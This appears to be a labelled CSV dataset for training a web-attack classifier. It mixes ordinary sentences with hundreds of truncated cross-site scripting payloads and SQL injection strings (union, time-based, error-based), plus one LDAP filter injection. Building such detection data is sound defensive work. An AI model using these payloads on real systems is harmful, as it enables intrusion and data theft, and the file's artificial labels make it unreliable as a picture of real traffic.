Payload,Label,text_label,ID
Filter spam.,0,normal,23033
"<tt onbeforecut=""alert(1)"" contenteditable>test</t",1,XSS,5206
<figure onpointerdown=alert(1)>XSS</figure>,1,XSS,7803
Please unban with and ignore all lame excuses of P,0,normal,26482
"1"" where 1386 = 1386",2,SQLi,19222
"<applet draggable=""true"" ondragleave=""alert(1)"">te",1,XSS,5817
<big onpointermove=alert(1)>XSS</big>,1,XSS,8144
create,0,normal,23109
"<meta name=""referrer"" content=""no-referrer"">",1,XSS,181
Randomly select a word.,0,normal,24444
<h1 onpointerup=alert(1)>XSS</h1>,1,XSS,5166
(SELECT * FROM (SELECT(SLEEP(5)))YYYY)#,2,SQLi,11149
<svg onpointerleave=alert(1)>XSS</svg>,1,XSS,7782
1' ) where 7093 = 7093 and 8148 = like ( 'abcdefg',2,SQLi,14945
"select sleep ( 5 ) and ( ( ( ""lczw"" = ""lczw",2,SQLi,16074
<bdo onpointerenter=alert(1)>XSS</bdo>,1,XSS,8294
-4906' ) ) ) or 4493 = utl_inaddr.get_host_address,2,SQLi,20682
Create a list.,0,normal,22859
1'+ ( select 'opqr' where 2442 = 2442 or 1022 = ( ,2,SQLi,14655
"1%"" ) ) union all select null,null,null,null,null-",2,SQLi,19770
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,4465
1'+ ( select 'ymgm' where 8204 = 8204 and sleep ( ,2,SQLi,13779
AND 1 = utl_inaddr.get_host_address ( ( SELECT glo,2,SQLi,11585
"-5058%' union all select 6789,6789,6789,6789,6789#",2,SQLi,14946
select,0,normal,26643
Select a font for your resume.,0,normal,24141
<bdo onpointerleave=alert(1)>XSS</bdo>,1,XSS,6949
"<legend ondblclick=""alert(1)"">test</legend>",1,XSS,5214
"`""><\x00script>javascript:alert(1)</script>",1,XSS,361
<x contenteditable onkeyup=alert(1)>press any key!,1,XSS,9341
"1%"" union all select null,null,null,null#",2,SQLi,20747
"{""id"":null,""name"":""Charmander""}",0,normal,27187
1' ) where 7541 = 7541,2,SQLi,17997
-1236'+ ( select 'fbgh' where 3896 = 3896 union al,2,SQLi,13460
Voters first select their preferred candidate -- t,0,normal,25182
The process can select even a single binding phage,0,normal,25387
"<head onbeforecut=""alert(1)"" contenteditable>test<",1,XSS,5844
1 ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ),2,SQLi,14819
Where to insert this value?,0,normal,23440
"<em onkeypress=""alert(1)"" contenteditable>test</em",1,XSS,2717
"-7240' ) ) union all select 8064,8064,8064#",2,SQLi,15199
"1"" and 6414 = ( select count ( * ) from rdb$fields",2,SQLi,15586
"-9988%"" or elt ( 1032 = 1032,3623 ) and ""%"" = """,2,SQLi,16299
"<aside oncopy=""alert(1)"" contenteditable>test</asi",1,XSS,7462
"After all, your daughter will have the name you se",0,normal,26402
"1%"" and 2805 = 1345",2,SQLi,18979
"1' ) ) ) or row ( 1045,7562 ) > ( select count ( *",2,SQLi,18092
"1%"" ) and 3824 = benchmark ( 5000000,md5 ( 0x76555",2,SQLi,21941
<shadow id=x tabindex=1 onactivate=alert(1)></shad,1,XSS,8401
1' ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ),2,SQLi,20089
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10--",2,SQLi,10572
"<SCRIPT SRC=""http://.rocks/.jpg""></SCRIPT>",1,XSS,5985
"<footer onkeydown=""alert(1)"" contenteditable>test<",1,XSS,7925
"-4528"" ) or 5903 = ( 'qqpjq'|| ( select case 5903 ",2,SQLi,21754
select,0,normal,26616
"<table ondblclick=""alert(1)"">test</table>",1,XSS,2768
1 ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117,2,SQLi,18838
<iframe onfocusout=alert(1) id=x><input autofocus>,1,XSS,4893
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) an",2,SQLi,18555
select sleep ( 5 ) ) +',2,SQLi,15877
"-2548"" ) ) ) or 5107 = 8049--",2,SQLi,12468
select ( case when ( 7005 = 7118 ) then 1 else 700,2,SQLi,14566
1'+ ( select 'utlx' where 6256 = 6256 or extractva,2,SQLi,13289
"-1004"" where 6266 = 6266 order by 1#",2,SQLi,20806
Select song.,0,normal,23066
"Roebuck, the Radical member for Sheffield, gave no",0,normal,25741
1' ) where 8291 = 8291,2,SQLi,17947
Republicans will select their nominee at a Monday ,0,normal,25750
<sup id=x tabindex=1 onactivate=alert(1)></sup>,1,XSS,5327
Randomly select a color scheme.,0,normal,24368
<style>:target {color:red;}</style><sub id=x style,1,XSS,7049
<head onblur=alert(1) tabindex=1 id=x></head><inpu,1,XSS,7842
1 ) ) as klmm where 3107 = 3107,2,SQLi,20799
1' ) where 7903 = 7903,2,SQLi,20341
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,",2,SQLi,10523
"AND ELT(1337=1337,SLEEP(5)) OR '1337'='FMTE",2,SQLi,11279
"1%' ) ) ) union all select null,null#",2,SQLi,13994
"<menuitem draggable=""true"" ondragleave=""alert(1)"">",1,XSS,7901
"1"" union all select null,null,null,null,null,null,",2,SQLi,17214
"-9240' union all select 6538,6538,6538#",2,SQLi,19297
1'+ ( select 'dbvq' where 2045 = 2045 or 8514 = be,2,SQLi,22366
1 and 3580 = ( select count ( * ) from domain.doma,2,SQLi,13527
Select an item from the list by checking the check,0,normal,25649
"<image draggable=""true"" ondragleave=""alert(1)"">tes",1,XSS,2356
"<ruby draggable=""true"" ondragend=""alert(1)"">test</",1,XSS,4734
He ordered a pepperoni pizza for lunch.,0,normal,22895
"1' where 4102 = 4102 or extractvalue ( 1297,concat",2,SQLi,20918
1' ) where 3187 = 3187 order by 1#,2,SQLi,21218
"<article onkeydown=""alert(1)"" contenteditable>test",1,XSS,2376
"1 or benchmark(10000000,MD5(1))#",2,SQLi,10117
"ABC Home: Up to 60% off select sofas and seating, ",0,normal,26415
-7659' ) as bowy where 4835 = 4835 or 4747 = dbms_,2,SQLi,13252
>alert(1)</script><script/1=',1,XSS,9003
"1%"" ) and 8189 = ( select count ( * ) from sysibm.",2,SQLi,15175
<animate onpointerover=alert(1)>XSS</animate>,1,XSS,5154
"1%"" ) ) and 7756 = dbms_utility.sqlid_to_sqlhash (",2,SQLi,17832
"select count ( * ) from all_users t1,all_users t2,",2,SQLi,12630
1' ) ) as mdtm where 1393 = 1393 and char ( 107 ) ,2,SQLi,13729
You want to make sure the camera you select will b,0,normal,25063
"Select ""Devices,"" and then ""Bluetooth Devices"" fro",0,normal,25679
Could be everyone or just a select few family memb,0,normal,26264
"Except in the case of a select few, Irving's preac",0,normal,26207
"-9845"" ) as xpis where 1936 = 1936 or 1 group by c",2,SQLi,13129
<tr onpointerout=alert(1)>XSS</tr>,1,XSS,4031
<title onfocusout=alert(1) tabindex=1 id=x></title,1,XSS,3832
"1"" where 4808 = 4808 union all select null,null,nu",2,SQLi,12501
1' where 3612 = 3612 and ( select 9067 from ( sele,2,SQLi,12217
"<pre onmousemove=""alert(1)"">test</pre>",1,XSS,6899
"1"" or 6793 = ( select 6793 from pg_sleep ( 5 ) ) a",2,SQLi,13698
1' ) where 2090 = 2090,2,SQLi,15214
Robert Maxwell (1695-1765) was the author of Selec,0,normal,25744
1' ) ) as nxhp where 2649 = 2649 or 9643 = ( selec,2,SQLi,18556
"<colgroup onkeypress=""alert(1)"" contenteditable>te",1,XSS,4851
"&lt;BR SIZE=\""&{alert('XSS')}\""&gt;",1,XSS,981
<details onpointerleave=alert(1)>XSS</details>,1,XSS,7096
1' ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ,2,SQLi,14049
"<option onmouseleave=""alert(1)"">test</option>",1,XSS,6560
"<section onbeforecut=""alert(1)"" contenteditable>te",1,XSS,6139
") ) , waitfor delay '0:0:__TIME__'--",2,SQLi,11732
Delete the outdated messages from your chat.,0,normal,22988
"<%tag onmouseover=""(alert('XSS'))""> is invalid. <%",1,XSS,9753
"-7139"" ) where 2723 = 2723 or 3900 = 5082--",2,SQLi,18424
<address onfocusout=alert(1) tabindex=1 id=x></add,1,XSS,2932
if ( 8264 = 1939 ) select 8264 else drop function ,2,SQLi,15293
select * from users where id = 1 or ( \. ) = 1 uni,2,SQLi,11553
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,4375
"`) WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1",2,SQLi,11266
<hgroup onpointerleave=alert(1)>XSS</hgroup>,1,XSS,6623
-3062' ) ) or 6872 = 6872 and ( ( 'uzth' like 'uzt,2,SQLi,15350
Select your reflect.,0,normal,24974
1' ) ) ) or ( select 9173 from ( select count ( * ,2,SQLi,20026
WAITFOR DELAY '0:0:5',2,SQLi,11312
1' and exp ( ~ ( select * from ( select concat ( 0,2,SQLi,21409
"<tbody ondblclick=""alert(1)"">test</tbody>",1,XSS,6959
1' and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) |,2,SQLi,19463
"<u oncopy=""alert(1)"" contenteditable>test</u>",1,XSS,6773
"<th draggable=""true"" ondragleave=""alert(1)"">test</",1,XSS,6510
<style>:target {color:red;}</style><main id=x styl,1,XSS,8391
"<html onbeforepaste=""alert(1)"" contenteditable>tes",1,XSS,7388
"1"" and 2716 = ( select count ( * ) from sysusers a",2,SQLi,16872
1' rlike ( select ( case when ( 5567 = 5586 ) then,2,SQLi,20482
Select knife.,0,normal,24530
1' or 2367 = ( select count ( * ) from rdb$fields ,2,SQLi,14396
"1 ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71",2,SQLi,13733
Carefully select your wedding decor.,0,normal,24380
This window allows you to select different options,0,normal,25293
"-2838"" where 5442 = 5442 union all select 5442#",2,SQLi,21880
"<h1 draggable=""true"" ondragstart=""alert(1)"">test</",1,XSS,3969
"</a>//[""'`-->]]>]</div>",1,XSS,9029
"1"" ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706",2,SQLi,21327
"1"" ) where 3727 = 3727 and 4241 = convert ( int, (",2,SQLi,19826
"<blockquote draggable=""true"" ondragstart=""alert(1)",1,XSS,5021
"<spacer oncopy=""alert(1)"" contenteditable>test</sp",1,XSS,6947
select * from users where id = '1' union select $ ,2,SQLi,11620
1' where 8584 = 8584 order by 1#,2,SQLi,21782
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,4575
"1"" ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ",2,SQLi,12568
><script+src=https://ui.comet.aol.com/?module=head,1,XSS,9801
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,4855
<script>'alert\x281\x29'instanceof{[Symbol.hasInst,1,XSS,130
"To view the video clips, the site requires the use",0,normal,25247
"<cite onbeforecut=""alert(1)"" contenteditable>test<",1,XSS,6703
* ( | ( mail = * ) ),2,SQLi,12033
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,",2,SQLi,10584
"<basefont onmousedown=""alert(1)"">test</basefont>",1,XSS,6891
&lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;,1,XSS,1375
select * from users where id = 1 or \.< = 1 union ,2,SQLi,11778
1'+ ( select aahc where 5436 = 5436 and 3824 = ben,2,SQLi,16274
"1%"" ) and 9764 = 6037 and ( ""%"" = """,2,SQLi,20585
<rtc onpointerdown=alert(1)>XSS</rtc>,1,XSS,5802
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,6023
from,0,normal,26521
"<body onmouseover=""alert(1)"">test</body>",1,XSS,6146
Complete lists of current British periodicals are ,0,normal,26271
group by username having 1=1--,2,SQLi,9955
<command onpointerout=alert(1)>XSS</command>,1,XSS,7812
"<div onmouseover=""document.vulnerable=true;"">",1,XSS,1524
1' ) ( select ( case when ( 5451 = 5451 ) then reg,2,SQLi,20787
"<animate attributeName=""onunload"" to=""alert(89)""/>",1,XSS,9072
Where's the pub?,0,normal,23544
<html onpointerenter=alert(1)>XSS</html>,1,XSS,3924
"-5150 ) ) ) union all select 5660,5660,5660#",2,SQLi,16286
function,0,normal,23160
"ABC<div style=""x:\xE2\x80\x84expression(javascript",1,XSS,470
1'|| ( select 'nbmo' from dual where 5572 = 5572 a,2,SQLi,18310
Thus the filter object can be used to select a sub,0,normal,25289
"<caption onbeforecopy=""alert(1)"" contenteditable>t",1,XSS,7738
1' ) where 2808 = 2808,2,SQLi,19194
"1%' and make_set ( 1227 = 5627,5627 ) and '%' = '",2,SQLi,21824
"<xss onmouseenter=""alert(1)"" style=display:block>t",1,XSS,76
"{""id"":null,""firstName"":""Paulynn"",""lastName"":""Ng"",""",0,normal,27198
"<track draggable=""true"" ondragstart=""alert(1)"">tes",1,XSS,2437
"1 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ",2,SQLi,19353
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,8181
"<;OBJECT TYPE="";text/x-scriptlet""; DATA="";http://h",1,XSS,1608
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1",2,SQLi,10603
"1' ) ) and elt ( 4249 = 4249,7259 ) and ( ( 'oucg'",2,SQLi,22336
"<source onmousemove=""alert(1)"">test</source>",1,XSS,4285
"-4980"" or ( 8459 = 8459 ) *4906 and ""mnlj"" like ""m",2,SQLi,13101
"<nav onkeypress=""alert(1)"" contenteditable>test</n",1,XSS,7163
"<details onclick=""alert(1)"">test</details>",1,XSS,8846
"<script>throw{},onerror=Uncaught=eval,h=location.h",1,XSS,128
1'+ ( select 'diet' where 7004 = 7004 rlike sleep ,2,SQLi,18533
"-8382"" ) ) order by 1--",2,SQLi,14975
1'+ ( select zwsr where 6567 = 6567,2,SQLi,15918
"<select onkeydown=""alert(1)"" contenteditable>test<",1,XSS,6509
I'll select my makeup.,0,normal,24353
"<embed onclick=""alert(1)"">test</embed>",1,XSS,2225
"Plus, save $70 on KitchenAid K400 blender with tem",0,normal,25770
"-9505' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, (",2,SQLi,17401
1' where 1272 = 1272 or 2633 = dbms_pipe.receive_m,2,SQLi,18167
"<object oncopy=""alert(1)"" contenteditable>test</ob",1,XSS,7212
"&lt;?import namespace=\""t\"" implementation=\""#defa",1,XSS,1031
<~/XSS STYLE=xss:expression(alert('XSS'))>,1,XSS,1572
"<h1 onkeypress=""alert(1)"" contenteditable>test</h1",1,XSS,5918
-6597'+ ( select aewz where 4036 = 4036 union all ,2,SQLi,12925
select * from users where id = '1' or ( \ ) = 1 un,2,SQLi,12038
1'+ ( select zfpk where 9784 = 9784 or 4411 = ( se,2,SQLi,16189
1'+ ( select bjav where 6923 = 6923 and ( select *,2,SQLi,21650
<img src=x:prompt(eval(alt)) onerror=eval(src) alt,1,XSS,9466
"<slot onbeforecopy=""alert(1)"" contenteditable>test",1,XSS,7698
AS INJECTX WHERE 1=1 AND 1=1,2,SQLi,10231
"<a href=""javas\x02cript:javascript:alert(1)"" id=""f",1,XSS,434
Our Fortnite servers are really very bad today / l,0,normal,26486
1%' ) ) ) rlike ( select ( case when ( 7697 = 3334,2,SQLi,15323
"<ins onpaste=""alert(1)"" contenteditable>test</ins>",1,XSS,5926
"-5606 ) ) or 1 group by concat ( 0x7171706a71, ( s",2,SQLi,15296
"{""id"":null,""name"":""hot""}",0,normal,27315
1'+ ( select dnxi where 5850 = 5850 or 8156 = ( se,2,SQLi,21002
1'|| ( select 'ssvp' where 3300 = 3300 or 2367 = (,2,SQLi,20519
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,4169
%' RLIKE SLEEP(5) AND '1337%'='1337,2,SQLi,11232
1%' ) waitfor delay '0:0:5'--,2,SQLi,18983
"<IMG SRC=x onstalled=""alert(String.fromCharCode(88",1,XSS,1235
1,0,normal,26696
"<sCRIpt x="">"" src=//15.rs></script>",1,XSS,9245
"<applet onmouseup=""alert(1)"">test</applet>",1,XSS,6606
innerHTML=location.hash>#<script>alert(1)</script>,1,XSS,9381
or 1=1 limit 1 -- -+,2,SQLi,22489
Select a scent for the room.,0,normal,24022
1 ) where 8232 = 8232 and ( 3020 = 3020 ) *6703--,2,SQLi,14219
Where's the nature reserve?,0,normal,23592
<button onBeforeCut=javascript:alert(1)>,1,XSS,9581
&#x03c;,1,XSS,1077
Create a stunning painting.,0,normal,22554
Select arrive.,0,normal,24639
"1"" and make_set ( 8403 = 8403,8899 ) and ""fqxr"" li",2,SQLi,15820
"-6254"" where 8941 = 8941 or elt ( 1032 = 1032,3623",2,SQLi,18639
"1 ) where 1559 = 1559 or updatexml ( 1808,concat (",2,SQLi,17529
"<img src=x onerror=alert(String.fromCharCode(88,83",1,XSS,9690
declare,0,normal,23163
I need to decide where to go for a nature hike.,0,normal,23911
"-7296%' ) ) ) union all select 9322,9322,9322,9322",2,SQLi,16673
UNION ALL SELECT 'INJ'||'ECT'||'XXX'#,2,SQLi,10804
Select the perfect moment.,0,normal,24346
"<aside onpaste=""alert(1)"" contenteditable>test</as",1,XSS,6332
<img src=`%00`&NewLine; onerror=alert(1)&NewLine;,1,XSS,838
1'+ ( select acax where 4169 = 4169 or 5286 = ( se,2,SQLi,18789
"<style>@keyframes x{}</style><track style=""animati",1,XSS,2785
1'|| ( select 'bmyt' from dual where 9407 = 9407 o,2,SQLi,22126
"<keygen onmouseup=""alert(1)"">test</keygen>",1,XSS,6311
"<noscript draggable=""true"" ondragstart=""alert(1)"">",1,XSS,2144
1'|| ( select 'ghby' from dual where 4854 = 4854,2,SQLi,21988
Where did you find that inspiring museum?,0,normal,23843
1' ) ) ) and 1743 = 6793 and ( ( ( 'rgcv' = 'rgcv,2,SQLi,19393
-7610' or 3038 = 3038,2,SQLi,15391
"<style>@keyframes slidein {}</style><dir style=""an",1,XSS,4050
"<rb onclick=""alert(1)"">test</rb>",1,XSS,6622
<svg><figcaption onload=alert(1)></figcaption>,1,XSS,2080
<optgroup onpointerup=alert(1)>XSS</optgroup>,1,XSS,8500
1 ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ),2,SQLi,12120
"<nav draggable=""true"" ondragend=""alert(1)"">test</n",1,XSS,8818
"-6112"" ) union all select 8203,8203,8203,8203,8203",2,SQLi,18509
"<area oncut=""alert(1)"" contenteditable>test</area>",1,XSS,8037
"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""h",1,XSS,2077
"-6263"" union all select 8005,8005#",2,SQLi,21408
1' ) ) as wjfj where 3802 = 3802,2,SQLi,21864
"1"" ) as lexx where 2892 = 2892 or elt ( 6272 = 627",2,SQLi,21881
1' ) or 4411 = ( select count ( * ) from sysusers ,2,SQLi,22144
[a](javascript:prompt(document.cookie)),1,XSS,9408
"?getURLValue=javascript:alert(1)"",",1,XSS,9875
select * from users where id = 1 +$ 1 union select,2,SQLi,11839
"<bdo draggable=""true"" ondragstart=""alert(1)"">test<",1,XSS,7864
(SELECT * FROM (SELECT(SLEEP(5)))ecMj),2,SQLi,10407
"1' ) ) and 3824 = benchmark ( 5000000,md5 ( 0x7655",2,SQLi,21857
<style>:target {transform: rotate(180deg);}</style,1,XSS,3223
"""),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20",2,SQLi,10879
<style>//*{x:expression(alert(//))}//<style></styl,1,XSS,8011
"select count ( * ) from rdb$fields as t1,rdb$types",2,SQLi,13005
"{""id"":null,""name"":""snow""}",0,normal,27000
Select your brand.,0,normal,24894
1' in boolean mode ) and 9198 = 9198--,2,SQLi,20136
-8007' ) ) as bgpp where 9555 = 9555 or 4144 = ( s,2,SQLi,12498
"-1722' union all select 1408,1408,1408#",2,SQLi,19320
I have to select a new password for my account.,0,normal,23730
<body onunhandledrejection=alert(1)><script>fetch(,1,XSS,42
"</ foo=""><script>alert(1)</script>"">",1,XSS,964
Scroll down to the More Preferences section and se,0,normal,25696
"1 where 5401 = 5401 and elt ( 1210 = 1210,sleep ( ",2,SQLi,16573
"-4194"" ) ) ) or 4747 = dbms_utility.sqlid_to_sqlha",2,SQLi,14685
"1"" ) as kzuq where 4259 = 4259",2,SQLi,18238
Select liqueur.,0,normal,24519
"-6214"" union all select 3323,3323#",2,SQLi,14322
) or sleep(5)=,2,SQLi,10356
<meta onfocusout=alert(1) tabindex=1 id=x></meta><,1,XSS,7961
1'|| ( select 'tznb' from dual where 8808 = 8808 r,2,SQLi,14197
1'|| ( select 'bwqc' from dual where 6897 = 6897 a,2,SQLi,16095
<applet onpointerout=alert(1)>XSS</applet>,1,XSS,5569
"1' where 2123 = 2123 or 8384 = like ( 'abcdefg',up",2,SQLi,16905
<footer onpointerenter=alert(1)>XSS</footer>,1,XSS,6205
The same son also published an edition of Paulding,0,normal,25380
select * from users where id = 1 <@1$ union select,2,SQLi,11793
<track onpointerdown=alert(1)>XSS</track>,1,XSS,8057
"1' where 3425 = 3425 and elt ( 4249 = 4249,7259 ) ",2,SQLi,19552
"<summary draggable=""true"" ondragend=""alert(1)"">tes",1,XSS,3146
<tt onblur=alert(1) tabindex=1 id=x></tt><input au,1,XSS,3547
<embed id=x tabindex=1 onbeforedeactivate=alert(1),1,XSS,2279
Select last.,0,normal,24486
<footer onpointerdown=alert(1)>XSS</footer>,1,XSS,8251
"1"" where 1809 = 1809 and make_set ( 8403 = 8403,88",2,SQLi,22046
"<kbd onkeypress=""alert(1)"" contenteditable>test</k",1,XSS,5357
<iframe src=`http://xssme.html5sec.org/?xss=<ifram,1,XSS,9201
"select * from users where id = 1 or 1#""@ union sel",2,SQLi,11483
%2522%253E%253Csvg%2520o%256Enoad%253Dalert%25281%,1,XSS,9405
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,",2,SQLi,10552
"<noembed onmousedown=""alert(1)"">test</noembed>",1,XSS,2465
"<style>@keyframes x{}</style><basefont style=""anim",1,XSS,7027
"{""id"":null,""firstName"":""Christopher"",""lastName"":""K",0,normal,27223
"<rt onmouseout=""alert(1)"">test</rt>",1,XSS,8046
<style>:target {color: red;}</style><spacer id=x s,1,XSS,3488
"In ' FrontPage Editor ', select the tab at the bot",0,normal,26031
"select * from users where id = 1 union select !<@,",2,SQLi,12081
"1%"" union all select null,null,null,null,null--",2,SQLi,20761
Tap and select the speech you want read back to yo,0,normal,25505
"1' union all select null,null,null,null,null,null,",2,SQLi,22249
"javascript:/*""//'//`//\""//--></script></title></st",1,XSS,9501
"Up to 35% off select washing machines, ovens, and ",0,normal,25213
<button onDragEnd=javascript:alert(1)>,1,XSS,9605
"<dt onkeyup=""alert(1)"" contenteditable>test</dt>",1,XSS,4603
"<address onbeforecopy=""alert(1)"" contenteditable>t",1,XSS,8585
"select count ( * ) from domain.domains as t1,domai",2,SQLi,21558
"-5355"" or make_set ( 9354 = 9354,7185 )",2,SQLi,18960
select case when 8227 = 1229 then 1 else null end-,2,SQLi,13640
"<rp onbeforecopy=""alert(1)"" contenteditable>test</",1,XSS,5850
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,3492
"<input oncopy=alert(1) value=""XSS"" autofocus>",1,XSS,3172
1' ) ) ) rlike ( select * from ( select ( sleep ( ,2,SQLi,16177
")) AND ELT(1337=1337,SLEEP(5)) AND ((1337""=""1337",2,SQLi,11272
Join the hiking expedition.,0,normal,22590
"-8544%"" or 6872 = 6872 and ""%"" = """,2,SQLi,21398
"1' ) and make_set ( 8403 = 8403,8899 ) and ( 'dhoo",2,SQLi,16907
"1%"" ) ) ) and ( select 9067 from ( select count ( ",2,SQLi,19572
"-4044%"" or 4493 = utl_inaddr.get_host_address ( ch",2,SQLi,16678
"1"" where 7739 = 7739 and sleep ( 5 ) --",2,SQLi,12327
I need to decide where to go for a weekend getaway,0,normal,23694
<kbd onpointerdown=alert(1)>XSS</kbd>,1,XSS,6030
") or benchmark ( 10000000,MD5 ( 1 ) ) #",2,SQLi,11683
Select mature.,0,normal,24773
1 ) ) as cbdx where 8998 = 8998 and elt ( 4249 = 4,2,SQLi,13981
1' ) ) as ydbt where 8062 = 8062 and 6414 = ( sele,2,SQLi,15066
"1"" ) ) as zgig where 5748 = 5748 and 6055 = ctxsys",2,SQLi,17992
-2817 ) where 1212 = 1212 or 3266 = 1102,2,SQLi,20454
1' ) ) ) rlike ( select ( case when ( 7689 = 7689 ,2,SQLi,17999
<footer id=x tabindex=1 onbeforeactivate=alert(1)>,1,XSS,2503
top['al\145rt'](1),1,XSS,9383
Select the perfect dress for the party.,0,normal,24199
"-6548%"" ) union all select 6067,6067,6067,6067,606",2,SQLi,21560
Select motivate.,0,normal,24733
"<video onbeforepaste=""alert(1)"" contenteditable>te",1,XSS,2045
1'|| ( select 'jlon' where 1461 = 1461,2,SQLi,12991
"<content onclick=""alert(1)"">test</content>",1,XSS,3196
"<dt draggable=""true"" ondragstart=""alert(1)"">test</",1,XSS,3106
"Select the ""More"" button next to the video you wan",0,normal,25603
[clickme](vbscript:alert(document.domain)),1,XSS,9422
"<embed onmouseout=""alert(1)"">test</embed>",1,XSS,3165
call regexp_substring ( repeat ( right ( char ( 37,2,SQLi,12155
"select * from users where id = 1 or "". ( "" or 1 = ",2,SQLi,11402
1,0,normal,26721
Retrieve rows where necessary.,0,normal,23357
"{""id"":null,""firstName"":""Zoe"",""lastName"":""Chan"",""ad",0,normal,26865
""") waitfor delay '0:0:20' --",2,SQLi,10936
<tfoot id=x tabindex=1 onfocusin=alert(1)></tfoot>,1,XSS,7845
select * from users where id = 1 +$+. union select,2,SQLi,11899
"<animation xlink:href=""data:text/xml,%3Csvg xmlns=",1,XSS,9074
"1,updatexml ( 2917,concat ( 0x2e,0x7171706a71, ( s",2,SQLi,16960
"{""id"":null,""name"":""Alligator""}",0,normal,27052
"select like ( 'abcdefg',upper ( hex ( randomblob (",2,SQLi,14660
"1%' ) union all select null,null,null,null,null,nu",2,SQLi,15816
",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:",2,SQLi,10890
1 where 5700 = 5700,2,SQLi,19239
"Customers can also select ""Mx."" in lieu of Ms., Mr",0,normal,26256
"1 and 4241 = convert ( int, ( select char ( 113 ) ",2,SQLi,19466
"1"" ) where 5814 = 5814 and 6969 = ( select 6969 fr",2,SQLi,14415
select * from users where id = '1' or $ 1 = 1 or 1,2,SQLi,11554
"perl -e 'print \""<IMG SRC=java\0script:alert(\""XSS",1,XSS,1317
select * from users where id = 1 +1 union select 1,2,SQLi,11729
1%' ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) |,2,SQLi,19424
`'><script>\x2Bjavascript:alert(516)</script>,1,XSS,8972
<frameset onpageshow=alert(1)>,1,XSS,7098
1' and 1=(select count(*) from tablenames); --,2,SQLi,10055
"<dialog ondblclick=""alert(1)"">test</dialog>",1,XSS,3484
"1%"" rlike ( select ( case when ( 5135 = 9839 ) the",2,SQLi,22191
"1%"" union all select null,null,null,null,null,null",2,SQLi,17309
"1"" ) and 4386 = utl_inaddr.get_host_address ( chr ",2,SQLi,14497
1' ) ) as kxek where 3429 = 3429 or 6979 = like ( ,2,SQLi,17089
"<dir onmouseup=""alert(1)"">test</dir>",1,XSS,7741
Select triple-check.,0,normal,24570
"<caption onmouseleave=""alert(1)"">test</caption>",1,XSS,6968
<hr onpointerover=alert(1)>XSS</hr>,1,XSS,6126
Select your choice.,0,normal,24883
or '1'='1'/*,2,SQLi,9965
1 ) rlike ( select * from ( select ( sleep ( 5 ) ),2,SQLi,22320
"setTimeout(\\""writetitle()\\"",$\_GET\[\])",1,XSS,7657
"On Virgin America, Main Cabin Select gets you a co",0,normal,25833
"<multicol onkeydown=""alert(1)"" contenteditable>tes",1,XSS,7804
a29b1%3balert(888)//a62b7156d82,1,XSS,9740
select,0,normal,26610
1 ) ) as zykv where 2158 = 2158,2,SQLi,19002
"1"" ) ) as xbhp where 7527 = 7527",2,SQLi,21334
"` WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 13",2,SQLi,11265
